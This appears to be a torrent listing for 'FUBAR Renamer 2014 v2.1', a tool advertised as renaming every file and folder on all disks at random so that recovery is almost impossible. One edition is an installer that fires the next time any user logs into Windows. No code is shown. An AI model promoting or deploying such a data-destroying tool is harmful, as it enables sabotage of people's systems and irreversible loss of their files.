Some extra files was required.\nThe coded needed has now been added to the application; and thus the extra files has also been removed from the installer, as they are no longer needed.\n\nXP-support has been recoded. This version will now run on XP as well.\n\n-----------\n\n\n\n\nAnother version of this very destructive tool!\n\nAs always, there is 2 warnings, when you run this application.\n\nThis application will rename all files and folders, on all harddisks and removable disks.\nAll items will be given a completely random new name.\n\nNothing will be deleted or destroyed. Only files and folders will be renamed.\nRecovery is almost impossible!\n\n\nThis time, you get 2 editions:\n- The normal one, which will do it's job when you run it.\n- An installer, that will run next time any user logs into Windows.\n\n\nThis version will work on Windows XP!\n\n\n\nHave fun, enjoy. And be careful!\n\n\n/Ubehage","torrent":{"xt":"urn:btih:4cbd2ec519d0b716c2baa05033e01d616a53a10b","amp;dn":"FUBAR+Renamer+2014+v2.1","amp;tr":["udp%3A%2F%2Ftracker.openbittorrent.com%3A80","udp%3A%2F%2Fopen.demonii.com%3A1337","udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969","udp%3A%2F%2Fexodus.desync.com%3A6969"],"infoHash":"4cbd2ec519d0b716c2baa05033e01d616a53a10b","infoHashBuffer":{"type":"Buffer","data":[76,189,46,197,25,208,183,22,194,186,160,80,51,224,29,97,106,83,161,11]},"announce":[],"urlList":[]}}
